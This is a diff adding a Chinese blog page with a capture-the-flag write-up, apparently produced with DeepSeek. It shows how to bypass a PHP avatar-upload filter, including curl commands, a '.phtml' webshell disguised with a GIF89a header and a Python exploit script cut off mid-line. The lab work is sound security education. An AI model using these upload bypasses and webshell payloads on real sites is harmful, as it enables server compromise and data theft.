@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp题目信息 目标地址: http:&#x2F;&#x2F;2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81&#x2F; Flag: flag{64baf9a6-fdcc-4338-805d-bea8f7ec68ba}  题目分析打开靶机，页面是一个”上传头像”(上传头像)的表单页面，提">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp">
+<meta property="og:url" content="https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/index.html">
+<meta property="og:site_name" content="zhaochoudecat">
+<meta property="og:description" content="BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp题目信息 目标地址: http:&#x2F;&#x2F;2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81&#x2F; Flag: flag{64baf9a6-fdcc-4338-805d-bea8f7ec68ba}  题目分析打开靶机，页面是一个”上传头像”(上传头像)的表单页面，提">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-02T19:58:35.047Z">
+<meta property="article:author" content="zhaochoudecat">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2026/05/02/BUUCTF/WEB/6-upload/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2026/05/02/BUUCTF/WEB/7-knife/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&text=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&is_video=false&description=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&name=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98-%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F-DeepSeek-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-1%EF%BC%9A%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0-PHP-%E6%96%87%E4%BB%B6-%E2%86%92-%E5%8F%91%E7%8E%B0%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">测试 1：直接上传 PHP 文件 → 发现扩展名检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-2%EF%BC%9A%E5%AF%B9%E6%AF%94%E4%B8%8D%E5%90%8C%E6%89%A9%E5%B1%95%E5%90%8D%EF%BC%8C%E5%AE%9A%E4%BD%8D%E7%AC%AC%E4%B8%80%E9%81%93%E9%98%B2%E7%BA%BF-%E2%86%92-%E5%8F%91%E7%8E%B0-MIME-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">测试 2：对比不同扩展名，定位第一道防线 → 发现 MIME 类型检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-3%EF%BC%9A%E7%BB%95%E8%BF%87-MIME-%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%A7%A6%E5%8F%91%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B-%E2%86%92-%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">测试 3：绕过 MIME 类型，触发内容检测 → 发现 &lt;? 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-4%EF%BC%9A%E4%BD%BF%E7%94%A8-%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.4.</span> <span class="toc-text">测试 4：使用 &lt;script language&#x3D;&quot;php&quot;&gt; 绕过 &lt;? 过滤 → 发现 Magic Bytes 检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-5%EF%BC%9A%E6%9C%80%E7%BB%88%E7%BB%95%E8%BF%87-%E2%80%94-GIF89a-phtml-MIME-script%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.5.</span> <span class="toc-text">测试 5：最终绕过 — GIF89a + .phtml + MIME + script标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E6%AD%A5%E9%AA%A4%EF%BC%9A%E5%AE%9A%E4%BD%8D%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.6.</span> <span class="toc-text">额外步骤：定位上传目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6%E6%B1%87%E6%80%BB"><span class="toc-number">1.3.</span> <span class="toc-text">绕过条件汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-Payload-%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">第一步：构造 Payload 并上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AE%BF%E9%97%AE-Webshell-%E8%8E%B7%E5%8F%96-Flag"><span class="toc-number">1.4.2.</span> <span class="toc-text">第二步：访问 Webshell 获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Exploit-%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.</span> <span class="toc-text">Python Exploit 版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">相关知识点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MIME-%E6%A0%A1%E9%AA%8C%E7%9A%84%E8%84%86%E5%BC%B1%E6%80%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. MIME 校验的脆弱性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%A9%E5%B1%95%E5%90%8D%E9%BB%91%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. 扩展名黑名单机制的缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PHP-%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E8%AF%AD%E6%B3%95"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. PHP 其他标签语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Magic-Bytes-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. Magic Bytes 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Nginx-Apache-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9E%B6%E6%9E%84"><span class="toc-number">1.6.5.</span> <span class="toc-text">5. Nginx + Apache 反向代理架构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">zhaochoudecat</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-05-01T16:00:00.000Z" itemprop="datePublished">2026-05-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="BUUCTF-文件上传绕过实战-上传头像-DeepSeek-WriteUp"><a href="#BUUCTF-文件上传绕过实战-上传头像-DeepSeek-WriteUp" class="headerlink" title="BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"></a>BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li><strong>目标地址</strong>: <code>http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/</code></li>
+<li><strong>Flag</strong>: <code>flag{64baf9a6-fdcc-4338-805d-bea8f7ec68ba}</code></li>
+</ul>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开靶机，页面是一个”上传头像”(上传头像)的表单页面，提交到 <code>upload_file.php</code>。</p>
+<p>通过逐步测试（每一步都伴随具体的 curl 命令和返回结果），发现服务器对上传文件做了多重过滤。</p>
+<hr>
+<h3 id="测试-1：直接上传-PHP-文件-→-发现扩展名检测"><a href="#测试-1：直接上传-PHP-文件-→-发现扩展名检测" class="headerlink" title="测试 1：直接上传 PHP 文件 → 发现扩展名检测"></a>测试 1：直接上传 PHP 文件 → 发现扩展名检测</h3><p><strong>测试命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span> &gt; /tmp/test.php</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/test.php&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>Not image!</code></p>
+<p>说明服务器在接收文件时首先检查了文件扩展名，只允许图片扩展名(gif&#x2F;jpg&#x2F;jpeg&#x2F;png)通过。</p>
+<p>只显示body标签的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -F <span class="string">&quot;file=@./tmp/test.php&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php | sed -n <span class="string">&#x27;/&lt;body&gt;/,/&lt;\/body&gt;/p&#x27;</span> | sed -e <span class="string">&#x27;1d;$d;s/&lt;[^&gt;]*&gt;//g&#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;[:space:]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="测试-2：对比不同扩展名，定位第一道防线-→-发现-MIME-类型检测"><a href="#测试-2：对比不同扩展名，定位第一道防线-→-发现-MIME-类型检测" class="headerlink" title="测试 2：对比不同扩展名，定位第一道防线 → 发现 MIME 类型检测"></a>测试 2：对比不同扩展名，定位第一道防线 → 发现 MIME 类型检测</h3><p>先试 <code>.phtml</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span> &gt; /tmp/test.phtml</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/test.phtml&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>Not image!</code></p>
+<p>再试 <code>.gif</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span> &gt; /tmp/test.gif</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/test.gif&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>NO! HACKER! your file included &#39;&lt;?&#39;</code></p>
+<p>对比发现：</p>
+<ul>
+<li><code>.phtml</code> → <code>Not image!</code>（第一关都没过）</li>
+<li><code>.gif</code> → <code>NO! HACKER!</code>（过了第一关，被第二关拦住）</li>
+</ul>
+<p>这说明第一道防线不止检查扩展名，还检查了 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>（MIME 类型）。<code>.gif</code> 的默认 MIME 是 <code>image/gif</code> 所以通过；<code>.phtml</code> 的默认 MIME 不是图片类型所以被拦。</p>
+<hr>
+<h3 id="测试-3：绕过-MIME-类型，触发内容检测-→-发现"><a href="#测试-3：绕过-MIME-类型，触发内容检测-→-发现" class="headerlink" title="测试 3：绕过 MIME 类型，触发内容检测 → 发现 &lt;? 过滤"></a>测试 3：绕过 MIME 类型，触发内容检测 → 发现 <code>&lt;?</code> 过滤</h3><p><strong>测试命令（<code>.phtml</code> + 显式 MIME 类型）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;</span> &gt; /tmp/test.phtml</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/test.phtml;type=image/jpeg&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>NO! HACKER! your file included &#39;&lt;?&#39;</code></p>
+<p>这次 <code>.phtml</code> + <code>type=image/jpeg</code> 通过了扩展名和 MIME 两道检查，进入了内容检测环节。服务器读取了文件内容，发现 <code>&lt;?</code> 字符串就拦截了。</p>
+<p>结论：后端使用 <code>file_get_contents()</code> 或类似方式读取文件内容并检测 <code>&lt;?</code> 关键词。</p>
+<hr>
+<h3 id="测试-4：使用-绕过"><a href="#测试-4：使用-绕过" class="headerlink" title="测试 4：使用 &lt;script language=&quot;php&quot;&gt; 绕过 &lt;? 过滤 → 发现 Magic Bytes 检测"></a>测试 4：使用 <code>&lt;script language=&quot;php&quot;&gt;</code> 绕过 <code>&lt;?</code> 过滤 → 发现 Magic Bytes 检测</h3><p><strong>测试命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;system(&quot;id&quot;);&lt;/script&gt;&#x27;</span> &gt; /tmp/test.phtml</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/test.phtml;type=image/jpeg&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>Don&#39;t lie to me, it&#39;s not image at all!!!</code></p>
+<p>终于没有触发 <code>&lt;?</code> 过滤了，但出现了新的拦截。说明后端读取了文件头部字节来判断是否为有效图片格式（magic bytes 检测），当前文件没有合法的图片文件头所以被拒。</p>
+<hr>
+<h3 id="测试-5：最终绕过-—-GIF89a-phtml-MIME-script标签"><a href="#测试-5：最终绕过-—-GIF89a-phtml-MIME-script标签" class="headerlink" title="测试 5：最终绕过 — GIF89a + .phtml + MIME + script标签"></a>测试 5：最终绕过 — GIF89a + .phtml + MIME + script标签</h3><p><strong>测试命令：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;GIF89a &lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag*&quot;);&lt;/script&gt;&#x27;</span> &gt; /tmp/shell.phtml</span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/shell.phtml;type=image/jpeg&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>返回结果：</strong> <code>上传文件名: shell.phtml</code></p>
+<p>四道防线全部绕过，文件上传成功。</p>
+<h3 id="额外步骤：定位上传目录"><a href="#额外步骤：定位上传目录" class="headerlink" title="额外步骤：定位上传目录"></a>额外步骤：定位上传目录</h3><p>上传成功后需要知道文件被存到了哪个路径。通过枚举常见上传目录来定位：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> <span class="string">&quot;test.gif&quot;</span> <span class="string">&quot;uploads/test.gif&quot;</span> <span class="string">&quot;upload/test.gif&quot;</span> <span class="string">&quot;images/test.gif&quot;</span>; <span class="keyword">do</span></span><br><span class="line">  code=$(curl -s -o /dev/null -w <span class="string">&quot;%&#123;http_code&#125;&quot;</span> <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/<span class="variable">$path</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$path</span> → HTTP <span class="variable">$code</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.gif → 404</span><br><span class="line">uploads/test.gif → 404</span><br><span class="line">upload/test.gif → 200</span><br><span class="line">images/test.gif → 404</span><br></pre></td></tr></table></figure>
+
+<p>确认文件存储在 <code>/upload/</code> 目录下。</p>
+<hr>
+<h2 id="绕过条件汇总"><a href="#绕过条件汇总" class="headerlink" title="绕过条件汇总"></a>绕过条件汇总</h2><p>实际绕过需要同时满足 <strong>全部4项条件</strong>，缺一不可：</p>
+<table>
+<thead>
+<tr>
+<th>检测层</th>
+<th>触发条件</th>
+<th>错误提示</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>扩展名</td>
+<td>非图片扩展名(php&#x2F;php5&#x2F;phtml)</td>
+<td><code>Not image!</code></td>
+<td>使用 <code>.phtml</code> 扩展名</td>
+</tr>
+<tr>
+<td>MIME 类型</td>
+<td>未设置或非图片 MIME</td>
+<td><code>Not image!</code></td>
+<td>设置 <code>type=image/jpeg</code></td>
+</tr>
+<tr>
+<td>内容 <code>&lt;?</code></td>
+<td>文件内容包含 <code>&lt;?</code></td>
+<td><code>NO! HACKER! your file included &#39;&lt;?&#39;</code></td>
+<td>使用 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
+</tr>
+<tr>
+<td>Magic Bytes</td>
+<td>文件头不是有效图片格式</td>
+<td><code>Don&#39;t lie to me, it&#39;s not image at all!!!</code></td>
+<td>文件头添加 <code>GIF89a</code></td>
+</tr>
+</tbody></table>
+<p>所有检测均通过后，返回 <code>上传文件名: xxx.phtml</code>。</p>
+<h2 id="Exploit-过程"><a href="#Exploit-过程" class="headerlink" title="Exploit 过程"></a>Exploit 过程</h2><h3 id="第一步：构造-Payload-并上传"><a href="#第一步：构造-Payload-并上传" class="headerlink" title="第一步：构造 Payload 并上传"></a>第一步：构造 Payload 并上传</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造包含命令执行的临时文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;GIF89a &lt;script language=&quot;php&quot;&gt;system(&quot;cat /flag*&quot;);&lt;/script&gt;&#x27;</span> &gt; /tmp/shell.phtml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传文件，显式指定 MIME type 为 image/jpeg</span></span><br><span class="line">curl -s -F <span class="string">&quot;file=@/tmp/shell.phtml;type=image/jpeg&quot;</span> -F <span class="string">&quot;submit=提交&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传成功返回：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>上传文件名: shell.phtml<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第二步：访问-Webshell-获取-Flag"><a href="#第二步：访问-Webshell-获取-Flag" class="headerlink" title="第二步：访问 Webshell 获取 Flag"></a>第二步：访问 Webshell 获取 Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload/shell.phtml</span><br></pre></td></tr></table></figure>
+
+<p>返回结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a flag&#123;64baf9a6-fdcc-4338-805d-bea8f7ec68ba&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-Exploit-版本"><a href="#Python-Exploit-版本" class="headerlink" title="Python Exploit 版本"></a>Python Exploit 版本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2428bd85-3ba8-4e37-ae0c-da50b037dab7.node5.buuoj.cn:81/upload_file.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;GIF89a &lt;script language=&quot;php&quot;&gt;system(&quot;cat 